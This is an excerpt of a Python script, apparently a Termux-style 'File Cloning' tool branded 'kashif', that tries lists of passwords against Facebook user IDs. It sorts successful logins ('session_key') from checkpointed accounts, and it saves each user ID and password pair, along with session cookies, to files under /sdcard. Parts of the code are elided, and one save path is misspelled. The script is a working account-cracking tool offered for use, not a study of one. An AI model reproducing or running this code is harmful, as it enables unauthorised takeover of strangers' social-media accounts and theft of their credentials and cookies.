...
class System:
    ...
    def menu(self):
        try:
            os.makedirs('/sdcard/kashif')
        except:
            pass
        os.system('clear')
        print(self.logo)
        print(f' ({green}1{reset}) File Cloning')
        print(f' ({green}2{reset}) WhatsApp Group (kashif)')
        print(47 * '-')
    ...
    def cloning(self,uid,first,last):
        sys.stdout.write(f" {green}kashif{reset} {str(self.loop)}/{str(len(self.idz))} ({green}ok{reset}):{str(len(self.oku))} ({blue}cp{reset}):{str(len(self.cpu))}\r")
        ...
        for pw in self.passwords:
            try:
                ...
                if "session_key" in response:
                    ...
                    print(f'\r{greenn} [kashif-OK] {uid} | {pw} {reset}')
                    open('/sdcard/kashif/kashif-ok-with-cookies.txt','a').write(str(uid_pw))
                    open('/sdcard/kashif/kashif-ok.txt','a').write(f'{uid}|{pw}\n')
                    self.oku.append(uid)
                    break
                elif "User must verify their account" in response:
                    print(f'\r{blue} [kashif-CP] {uid} | {pw} {reset}')
                    open('/sdcard/kasif/kashif-cp.txt','a').write(f'{uid}|{pw}\n')
                    self.cpu.append(uid)
                    break
                else:
                    continue
...
if __name__ == "__main__":
    ...
    os.system('xdg-open https://www.facebook.com/profile.php?id=100093186915501')
    #time.sleep(5)
    logo = f'''
       _  __         _     _  __ 
       | |/ /__ _ ___| |__ (_)/ _|
